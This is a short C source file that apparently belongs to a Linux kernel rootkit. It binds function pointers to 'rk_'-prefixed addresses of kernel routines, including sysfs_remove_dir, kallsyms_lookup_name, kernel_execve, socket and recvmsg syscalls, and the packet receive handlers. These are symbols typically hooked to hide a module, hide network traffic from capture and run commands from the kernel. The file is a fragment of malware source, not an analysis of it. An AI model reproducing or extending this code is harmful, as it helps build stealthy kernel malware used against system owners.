#include "kernel_functions.h"

int (*fn_sysfs_remove_dir)(struct kobject*)                                                             = (void*) rk_sysfs_remove_dir;
struct sock* (*fn_netlink_lookup)(struct net*, int, u32)                                                = (void*) rk_netlink_lookup;
unsigned long (*fn_kallsyms_lookup_name)(const char*)                                                   = (void*) rk_kallsyms_lookup_name;
asmlinkage long (*fn_sys_socket)(int, int, int)                                                         = (void*) rk_sys_socket;
asmlinkage long (*fn_sys_recvmsg)(int, struct msghdr*, unsigned)                                        = (void*) rk_sys_recvmsg;
int (*kernel_execve)(const char*, char *const argv[], char *const envp[])                               = (void*) rk_kernel_execve;
int (*fn_packet_rcv)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*)      = (void*) rk_packet_rcv;
int (*fn_packet_rcv_spkt)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*) = (void*) rk_packet_rcv_spkt;
int (*fn_tpacket_rcv)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*)     = (void*) rk_tpacket_rcv;
